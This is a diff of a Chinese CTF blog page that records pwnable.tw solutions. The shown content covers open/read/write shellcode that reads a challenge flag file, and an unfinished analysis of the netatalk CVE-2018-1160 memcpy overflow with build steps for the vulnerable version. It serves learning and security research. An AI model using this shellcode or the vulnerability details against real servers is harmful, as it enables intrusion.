@@ -9,15 +9,20 @@
     <meta name="description" content="start是一段汇编 push    esp             ; esp是栈顶指针寄存器, 将栈顶地址入栈push    offset _exit    ; 将exit函数地址入栈xor     eax, eax        ; 清空eax, ebx, ecx, edx寄存器xor     ebx, ebx        ;xor     ecx, ecx        ;xor">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnable.tw做题记录">
-<meta property="og:url" content="http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:url" content="http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="1nv0k3r&#39;s blog">
 <meta property="og:description" content="start是一段汇编 push    esp             ; esp是栈顶指针寄存器, 将栈顶地址入栈push    offset _exit    ; 将exit函数地址入栈xor     eax, eax        ; 清空eax, ebx, ecx, edx寄存器xor     ebx, ebx        ;xor     ecx, ecx        ;xor">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-04-11T17:33:09.000Z">
-<meta property="article:modified_time" content="2021-04-11T17:33:09.697Z">
+<meta property="og:image" content="http://1nv0k3r.fun/2021/04/15/images/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2021-04-13-00-09-01.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2021/04/15/images/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2021-04-13-00-10-13.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2021/Users/liuji/Documents/%E5%8D%9A%E5%AE%A2/source/images/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2021-04-15-14-04-13.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2021/04/15/images/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2021-04-15-14-05-01.png">
+<meta property="article:published_time" content="2021-04-15T06:11:52.000Z">
+<meta property="article:modified_time" content="2021-04-15T06:23:29.007Z">
 <meta property="article:author" content="1nv0k3r">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://1nv0k3r.fun/2021/04/15/images/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2021-04-13-00-09-01.png">
     
     
         
@@ -53,8 +58,7 @@
     
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body class="max-width mx-auto px3 ltr">
-    
+<body class="max-width mx-auto px3 ltr">    
       <div id="header-post">
   <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
   <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
@@ -77,6 +81,8 @@
     <span id="actions">
       <ul>
         
+        <li><a class="icon" href="/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
         
         <li><a class="icon" href="/2021/01/27/CVE-2021-3156/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
@@ -91,16 +97,16 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&text=pwnable.tw做题记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description=pwnable.tw做题记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=pwnable.tw做题记录&body=Check out this article: http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&name=pwnable.tw做题记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&text=pwnable.tw做题记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description=pwnable.tw做题记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw做题记录&body=Check out this article: http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&name=pwnable.tw做题记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -129,7 +135,7 @@
       
     <div class="postdate">
       
-        <time datetime="2021-04-11T17:33:09.000Z" itemprop="datePublished">2021-04-12</time>
+        <time datetime="2021-04-15T06:11:52.000Z" itemprop="datePublished">2021-04-15</time>
         
       
     </div>
@@ -173,10 +179,29 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* open(file&#x3D;&#39;&#x2F;home&#x2F;orw&#x2F;flag&#39;, oflag&#x3D;0, mode&#x3D;0) *&#x2F;</span><br><span class="line">&#x2F;* push &#39;&#x2F;home&#x2F;orw&#x2F;flag\x00&#39; *&#x2F;</span><br><span class="line">push 0x1010101</span><br><span class="line">xor dword ptr [esp], 0x1016660</span><br><span class="line">push 0x6c662f77</span><br><span class="line">push 0x726f2f65</span><br><span class="line">push 0x6d6f682f</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor ecx, ecx</span><br><span class="line">xor edx, edx</span><br><span class="line">&#x2F;* call open() *&#x2F;</span><br><span class="line">push SYS_open &#x2F;* 5 *&#x2F;</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">&#x2F;* read(fd&#x3D;&#39;eax&#39;, buf&#x3D;&#39;esp&#39;, nbytes&#x3D;0x30) *&#x2F;</span><br><span class="line">mov ebx, eax</span><br><span class="line">mov ecx, esp</span><br><span class="line">push 0x30</span><br><span class="line">pop edx</span><br><span class="line">&#x2F;* call read() *&#x2F;</span><br><span class="line">push SYS_read &#x2F;* 3 *&#x2F;</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">&#x2F;* write(fd&#x3D;1, buf&#x3D;&#39;esp&#39;, n&#x3D;0x30) *&#x2F;</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">push 0x30</span><br><span class="line">pop edx</span><br><span class="line">&#x2F;* call write() *&#x2F;</span><br><span class="line">push SYS_write &#x2F;* 4 *&#x2F;</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
 <p>可以看到工具生成的shellcode比我们自己写的要更长一点, 所以如果遇到限制输入长度的情况下, 就需要自己缩减shellcode了</p>
 <p>另外我想在gdb里调试shellcode, 却一直没法在shellcode开头断下, 有大哥知道怎么操作可以教我一下</p>
-<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p>好家伙不愧是pwnable.tw, 上来第三题就是1day exp编写, 给了源码和libc, 先自己审一波看看能不能找到漏洞点</p>
-<p>给了目标程序和libc, 启动前需要设置一下库文件目录, 由于临时使用所以只需要<code>export LD_LIBRARY_PATH=./</code>即可</p>
-<p>可以看到目标程序是64位ELF, IDA看一下</p>
-<p>算了看不出来漏洞点, 先鸽了</p>
+<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p>好家伙不愧是pwnable.tw, 上来第三题就是1day exp编写, 给了源码和libc, 既然作为练习, 首先我们可以搜一波源码</p>
+<p>由于是开源项目netatalk, 我们可以先看一下GitHub的commit, 可以看到细节:</p>
+<p><img src="../images/pwnable-tw做题记录/2021-04-13-00-09-01.png" alt=""></p>
+<p><img src="../images/pwnable-tw做题记录/2021-04-13-00-10-13.png" alt=""></p>
+<p>漏洞是由于在<code>libatalk/dsi/dsi_opensess.c</code>文件中的<code>void dsi_opensession(DSI *dsi)</code>函数, 调用了一个memcpy:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* OpenSession. set up the connection */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dsi_opensession</span><span class="params">(DSI *dsi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">uint32_t</span> servquant;</span><br><span class="line">  <span class="keyword">uint32_t</span> replcsize;</span><br><span class="line">  <span class="keyword">int</span> offs;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setnonblock(dsi-&gt;socket, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      LOG(log_error, logtype_dsi, <span class="string">"dsi_opensession: setnonblock: %s"</span>, strerror(errno));</span><br><span class="line">      AFP_PANIC(<span class="string">"setnonblock error"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* parse options */</span></span><br><span class="line">  <span class="keyword">while</span> (i &lt; dsi-&gt;cmdlen) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (dsi-&gt;commands[i++]) &#123;</span><br><span class="line">    <span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + <span class="number">1</span>, dsi-&gt;commands[i]);</span><br><span class="line">      dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DSIOPT_SERVQUANT: <span class="comment">/* just ignore these */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以从GitHub clone下漏洞版本进行编译, 安装一些依赖:</p>
+<blockquote>
+<p>sudo apt-get install libtool-bin automake autoconf libgcrypt11-dev libcrack2-dev libgssapi-krb5-2 libgssapi3-heimdal libgssapi-perl libkrb5-dev libtdb-dev libevent-dev libdb-dev</p>
+</blockquote>
+<p>然后设置安装参数</p>
+<blockquote>
+<p>./configure —with-init-style=debian-systemd —without-libevent —without-tdb —with-cracklib —enable-krbV-uam —with-pam-confdir=/etc/pam.d —with-dbus-daemon=/usr/bin/dbus-daemon  —with-dbus-sysconf-dir=/etc/dbus-1/system.d —with-tracker-pkgconfig-version=1.0</p>
+</blockquote>
+<p>编译安装</p>
+<blockquote>
+<p>make &amp;&amp; make install</p>
+</blockquote>
+<p>在这个函数打断点, 然后运行起来看看哪些东西是我们可控的</p>
+<p>在<code>include/atalk/dsi.h</code>下看一下DSI结构体:</p>
+<p>关键结构体:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* child and parent processes might interpret a couple of these</span></span><br><span class="line"><span class="comment"> * differently. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DSI</span> &#123;</span></span><br><span class="line">    <span class="comment">// ..............................</span></span><br><span class="line">    <span class="keyword">uint32_t</span> attn_quantum, datasize, server_quantum;</span><br><span class="line">    <span class="keyword">uint8_t</span>  *commands; <span class="comment">/* DSI recieve buffer */</span></span><br><span class="line">    <span class="keyword">size_t</span>   datalen, cmdlen;</span><br><span class="line">    <span class="keyword">int</span>      socket;            <span class="comment">/* AFP session socket */</span></span><br><span class="line">&#125; DSI;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/../../../Users/liuji/Documents/博客/source/images/pwnable-tw做题记录/2021-04-15-14-04-13.png" alt=""><br><img src="../images/../images/pwnable-tw做题记录/2021-04-15-14-05-01.png" alt=""></p>
 
   </div>
 </article>
@@ -213,16 +238,16 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&text=pwnable.tw做题记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description=pwnable.tw做题记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=pwnable.tw做题记录&body=Check out this article: http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2021/04/12/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&name=pwnable.tw做题记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&text=pwnable.tw做题记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description=pwnable.tw做题记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw做题记录&body=Check out this article: http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=pwnable.tw做题记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&name=pwnable.tw做题记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -260,6 +285,22 @@
 </footer>
 
     </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
 </body>
 </html>
 <!-- styles -->
